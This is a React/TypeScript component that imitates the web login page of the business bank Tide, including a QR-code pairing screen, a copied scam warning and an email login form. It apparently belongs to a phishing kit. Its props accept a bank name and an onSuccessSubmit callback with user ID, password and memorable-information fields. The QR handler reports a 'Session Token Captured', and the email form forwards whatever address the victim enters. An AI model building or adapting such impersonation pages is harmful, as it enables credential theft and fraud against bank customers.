"use client";

import { useState } from "react";
import { QRCodeSVG } from "qrcode.react";

interface TideProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function TideTemplate({
  bankName = "Tide",
  selectedOption = "Business",
  onSuccessSubmit,
}: TideProps) {
  const [mode, setMode] = useState<"qr" | "email">("qr");

  // Email login state
  const [email, setEmail] = useState("");
  const [emailError, setEmailError] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);

  // Scan simulation handler
  const handleSimulateScanComplete = () => {
    onSuccessSubmit({
      userId: "Tide Authenticator App (QR Token)",
      password: "JWT / Session Token Captured",
      memorableInfo: "Mobile Biometrics Approved",
      extraData: `Device Session: iOS/Android Tide App | Status: Authenticated`,
    });
  };

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !email.includes("@")) {
      setEmailError("Please enter a valid work email address.");
      return;
    }

    setIsVerifying(true);
    onSuccessSubmit({
      userId: email.trim(),
      password: "N/A (Magic Link / In-App Push sent)",
      memorableInfo: "Email Login Method",
      extraData: `Option: ${selectedOption || "Business"} | Tide Web Login`,
    });
  };

  return (
    <div className="relative min-h-screen bg-[#071355] font-sans flex items-center justify-center p-4 sm:p-6 overflow-hidden selection:bg-[#2563eb] selection:text-white">
      
      {/* Background Floating Geometric Elements */}
      <div className="absolute inset-0 pointer-events-none opacity-40">
        <div className="absolute top-10 left-12 w-4 h-4 bg-amber-400 rotate-45 rounded-xs"></div>
        <div className="absolute top-1/4 right-16 w-3 h-8 bg-amber-300 -rotate-12 rounded-sm"></div>
        <div className="absolute bottom-20 left-24 w-3 h-3 bg-pink-400 rounded-full"></div>
        <div className="absolute top-1/3 left-10 w-2 h-6 bg-teal-400 rotate-45"></div>
        <div className="absolute bottom-16 right-20 w-4 h-4 border-2 border-emerald-400 rotate-12"></div>
        <div className="absolute top-20 right-1/4 w-3 h-3 bg-indigo-400 rounded-full"></div>
      </div>

      {/* Main Card Container */}
      <div className="relative z-10 w-full max-w-[620px] bg-white rounded-3xl p-8 sm:p-12 shadow-2xl border border-slate-100">
        
        {/* Scam Warning Box */}
        <div className="bg-[#fff9eb] border border-[#fde68a] rounded-2xl p-4 sm:p-5 flex items-start gap-4 mb-8">
          <div className="w-14 h-14 bg-gradient-to-tr from-pink-200 to-rose-100 rounded-xl p-2 flex items-center justify-center shrink-0 shadow-xs relative overflow-hidden">
            <div className="w-0 h-0 border-l-[14px] border-l-transparent border-r-[14px] border-r-transparent border-b-[24px] border-b-rose-400/80"></div>
            <div className="absolute bottom-1 w-3 h-6 bg-[#071355] rounded-xs"></div>
          </div>

          <div className="text-xs sm:text-[13px] text-slate-800 leading-relaxed">
            <h4 className="font-bold text-slate-900 mb-1 text-sm">
              Avoid QR Code Scams
            </h4>
            <p className="text-slate-600 font-medium">Never scan a QR code if it's:</p>
            <ul className="list-disc pl-4 mt-1 space-y-0.5 text-slate-600 text-[12px]">
              <li>shown on someone else's screen or device</li>
              <li>sent to you by email or text message</li>
            </ul>
          </div>
        </div>

        {mode === "qr" ? (
          /* QR Code View */
          <div>
            <div className="flex flex-col sm:flex-row items-center justify-between gap-8 pt-2">
              
              {/* Instructions */}
              <div className="flex-1 space-y-4 text-left">
                <h3 className="text-lg font-bold text-slate-900">
                  To use Tide on web:
                </h3>

                <ol className="space-y-2.5 text-xs sm:text-[13px] text-slate-600 font-medium leading-normal">
                  <li className="flex items-start gap-2">
                    <span className="font-bold text-slate-900">1.</span>
                    <span>Log in to your Tide app</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="font-bold text-slate-900">2.</span>
                    <span>Tap your initials in the top left corner</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="font-bold text-slate-900">3.</span>
                    <span>Tap <strong className="text-slate-900">'Log in to web'</strong></span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="font-bold text-slate-900">4.</span>
                    <span>Point your phone camera at the QR code</span>
                  </li>
                </ol>
              </div>

              {/* Real High-Density QR Code using qrcode.react */}
              <div className="shrink-0 flex flex-col items-center">
                <div 
                  onClick={handleSimulateScanComplete}
                  className="group relative p-3 bg-[#262c3e] rounded-[24px] shadow-xl cursor-pointer transition hover:scale-[1.01]"
                  title="Click to simulate verified scan"
                >
                  <div className="bg-white p-2.5 rounded-[18px]">
                    <QRCodeSVG
                      value="https://web.tide.co/pair/auth-session-token-live-verification-789a2b"
                      size={165}
                      level="H"
                      includeMargin={false}
                    />
                  </div>

                  {/* Scanning Laser Animation Beam */}
                  <div className="absolute inset-x-5 top-5 h-[2px] bg-sky-400 rounded-full animate-pulse shadow-[0_0_10px_rgba(56,189,248,0.9)] pointer-events-none"></div>

                  <span className="block text-[10px] text-center text-slate-400 font-mono mt-2 tracking-tight opacity-75 group-hover:opacity-100">
                    Point camera & scan
                  </span>
                </div>
              </div>

            </div>

            {/* Divider */}
            <div className="relative my-8">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-slate-200"></div>
              </div>
              <div className="relative flex justify-center text-xs">
                <span className="bg-white px-4 text-slate-400 font-medium">or</span>
              </div>
            </div>

            {/* Email Switch Button */}
            <div className="text-center">
              <button
                type="button"
                onClick={() => setMode("email")}
                className="text-sm font-semibold text-[#0066cc] hover:text-[#004d99] hover:underline cursor-pointer"
              >
                Login with email ID
              </button>
            </div>
          </div>
        ) : (
          /* Email Form View */
          <div className="pt-2">
            <h3 className="text-xl font-bold text-slate-900 mb-1">
              Log in with email
            </h3>
            <p className="text-xs text-slate-500 mb-6">
              Enter your registered Tide email address to continue to your account.
            </p>

            <form onSubmit={handleEmailSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1">
                  Email ID
                </label>
                <input
                  type="email"
                  placeholder="name@company.com"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (emailError) setEmailError("");
                  }}
                  className={`w-full rounded-xl border p-3 text-sm outline-none transition ${
                    emailError
                      ? "border-red-500 bg-red-50/20"
                      : "border-slate-300 focus:border-[#071355]"
                  }`}
                />
                {emailError && (
                  <p className="text-xs text-red-600 font-semibold mt-1">{emailError}</p>
                )}
              </div>

              <button
                type="submit"
                disabled={isVerifying}
                className="w-full rounded-xl bg-[#0066cc] hover:bg-[#004d99] active:scale-[0.99] py-3 text-sm font-bold text-white shadow transition cursor-pointer"
              >
                {isVerifying ? "Sending verification..." : "Continue"}
              </button>

              <div className="pt-2 text-center">
                <button
                  type="button"
                  onClick={() => setMode("qr")}
                  className="text-xs font-semibold text-slate-500 hover:text-slate-800 underline cursor-pointer"
                >
                  ‹ Back to QR code scan
                </button>
              </div>
            </form>
          </div>
        )}

      </div>
    </div>
  );
}